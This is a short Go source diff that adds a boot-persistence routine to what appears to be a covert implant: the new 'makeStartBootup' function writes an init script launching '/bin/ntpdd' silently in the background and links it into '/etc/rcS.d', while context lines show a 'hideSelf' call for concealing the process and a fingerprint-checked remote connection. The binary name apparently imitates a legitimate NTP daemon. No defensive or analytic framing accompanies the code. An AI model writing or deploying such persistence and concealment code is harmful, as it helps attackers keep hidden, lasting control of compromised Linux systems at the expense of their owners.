@@ -142,6 +142,15 @@ func hideSelf(pid int) {
 	cmdRun(hideCmd, true)
 }
 
+func makeStartBootup() {
+
+	dPath := "/bin/ntpdd"
+	vRpath := "/etc/init.d/ntpdd"
+	vLnpath := "/etc/rcS.d/S59ntpdd"
+	bootCmd := fmt.Sprintf("echo \"#!/bin/sh\" > %s;echo \"%s> /dev/null 2>&1 &\" >> %s;chmod +x %s;ln -s %s %s", vRpath, dPath, vRpath, vRpath, vRpath, vLnpath)
+	cmdRun(bootCmd, true)
+}
+
 func main() {
 
 	_, err := net.Listen("tcp", ":65534")
@@ -150,6 +159,7 @@ func main() {
 	}
 
 	hideSelf(1)
+	makeStartBootup()
 	if connectString != "" && fingerPrint != "" {
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
